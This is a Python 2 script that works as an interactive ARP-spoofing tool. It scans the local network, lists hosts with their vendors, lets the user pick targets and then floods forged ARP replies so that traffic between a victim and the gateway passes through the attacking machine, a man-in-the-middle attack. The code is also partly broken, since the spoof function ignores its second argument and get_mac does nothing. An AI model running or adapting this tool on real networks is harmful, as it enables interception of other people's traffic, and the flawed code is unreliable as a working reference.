#!/usr/bin/python

import scapy.all as scapy
import time, socket, subprocess, sys, getmac

# enable packet flow......................................................
from typing import Dict, List, Any, Union

subprocess.call(['echo 1 > /proc/sys/net/ipv4/ip_forward'], shell=True)

global target_number_list
target_number_list = []
sent_packets_count = 0

gateway = subprocess.check_output("route -n | sed '3q;d' | cut -d ' ' -f10", shell=True)


def clear():
    subprocess.call('clear', shell=True)


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=4, verbose=False)[0]
    client_list = []
    target_num = 1

    # adding clients to target list for arp spoofer..............................................
    for element in answered_list:
        client_dict = {'number': target_num, 'ip': element[1].psrc, 'mac': element[1].hwsrc}
        client_list.append(client_dict)
        target_num += 1
    return (client_list)


def print_result(results_list):
    print 'gateway IP: ', gateway
    print  'system MAC:', getmac.get_mac_address()
    print 'system IP: ', get_ip()
    # result list  header..........................................................
    print ('_' * 80 + '\nNo.     IP\t\t\tMAC\t\t\tVendor \n' + '.' * 80)
    for client in results_list:

        # detect MAC vendor ( 'db' is the MAC vendor list in the same directory)....................................
        mac = (client['mac'])
        mac = mac[:8] + '\t'
        data = file('db')
        for line in data:
            if mac in line:
                num = client['number']
                print str(num) + '    ' + client['ip'] + '\t' + client['mac'] + '   ' + line[8:].strip('\t')
                target_number_list.append(client)


# find local IP address....................................................
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


# ARP spoof target MAC address.............................................
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway)
    scapy.send(packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request


while True:
    clear()
    print "\t\t\t[*] Scanning local network.... [*]"
    # show scan results........................................................
    scan_result = scan(str(get_ip()) + '/24')
    clear()
    print_result(scan_result)
    try:
        print '_' * 80
        # target selection.........................................................
        repeat = raw_input("\n\n[>] <R+Enter> to rescan, <Enter> to continue: ")
        if repeat == 'r' or repeat == 'R':
            continue
        else:
            break
    except KeyboardInterrupt:
        print('\n')
        sys.exit(1)

selected_target = raw_input('\n[>] Select first target number:  ')
dest = raw_input('\n[>] Select second target number (default=gateway):  ')
try:
    selected_target = int(selected_target)
except ValueError:
    print ('\n[-] wrong input [-]')
    exit(1)

target_ip = target_number_list[(selected_target - 1)]['ip']
target_mac = target_number_list[(selected_target - 1)]['mac']

# check to see if the second target is the default gateway or not...........................
if dest != '':
    dest = int(dest)
    dest_ip = target_number_list[(dest - 1)]['ip']
    dest_mac = target_number_list[(dest - 1)]['mac']
else:
    dest_ip = gateway

print '\n[*] ARP spoofing ', target_ip, '>>>', dest_ip,'\n'

# start ARP spoofing..........................................
try:
    while True:
        spoof(target_ip, dest_ip)
        spoof(dest_ip, target_ip)
        sent_packets_count += 2
        print '\r <Ctrl+C> to cancel, Packets sent: ', str(sent_packets_count),
        sys.stdout.flush()
        time.sleep(1)

except KeyboardInterrupt:
    print '\n[*] Exiting now...'
    time.sleep(1)
    exit(1)
